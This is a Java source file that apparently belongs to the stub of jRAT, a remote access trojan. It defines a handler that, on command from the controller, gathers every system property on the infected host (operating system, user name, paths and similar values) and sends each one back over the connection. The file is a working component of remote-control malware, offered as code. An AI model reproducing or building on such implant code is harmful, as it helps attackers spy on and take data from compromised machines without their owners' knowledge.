package se.jrat.stub.packets.incoming;

import java.util.Set;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet32SystemProperties;


public class Packet90SystemProperties extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			con.addToSendQueue(new Packet32SystemProperties(str.toString(), System.getProperty(str.toString())));
		}
	}

}
